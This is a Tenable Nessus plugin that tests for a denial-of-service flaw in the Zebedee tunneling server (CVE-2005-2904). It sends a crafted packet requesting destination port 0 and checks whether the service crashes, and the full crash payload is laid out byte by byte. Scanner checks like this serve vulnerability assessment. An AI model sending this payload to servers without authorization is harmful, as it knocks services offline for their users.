#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19606);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2005-2904");
  script_bugtraq_id(14796);
  script_osvdb_id(19302);

  script_name(english:"Zebedee Malformed Protocol Option Header Port 0 Remote DoS");
  script_summary(english:"Tries to crash Zebedee server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote tunneling service is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The version of Zebedee installed on the remote host will crash if it
receives a request for a connection with a destination port of 0.  By
exploiting this flaw, an attacker could cause the affected application
to fail to respond to further requests." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/410157/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/mailarchive/forum.php?thread_id=8134987&forum_id=2055" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Zebedee 2.4.1A / 2.5.3 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/09");
 script_cvs_date("$Date: 2011/03/11 21:52:42 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
  script_dependencies("zebedee_detect.nasl");
  script_require_ports("Services/zebedee", 11965);
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"zebedee", default: 11965, exit_on_fail: 1);


# Try to crash the server.
soc = open_sock_tcp(port);
if (!soc) exit(1);

send(
  socket:soc,
  data:raw_string(
    0x02, 0x01,                                      # protocol version
    0x00, 0x00,                                      # flags
    0x20, 0x00,                                      # max message size
    0x00, 0x06,                                      # compression info
    0x00, 0x00,                                      # port request: value = 0x0
    0x00, 0x80,                                      # key length
    0xff, 0xff, 0xff, 0xff,                          # key token
    0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74,  # nonce value
    0x00, 0x00, 0x00, 0x00                           # target host address
  )
);
close(soc);


# There's a problem if it's down.
sleep(3);

if (service_is_dead(port: port) > 0)
  security_warning(port);
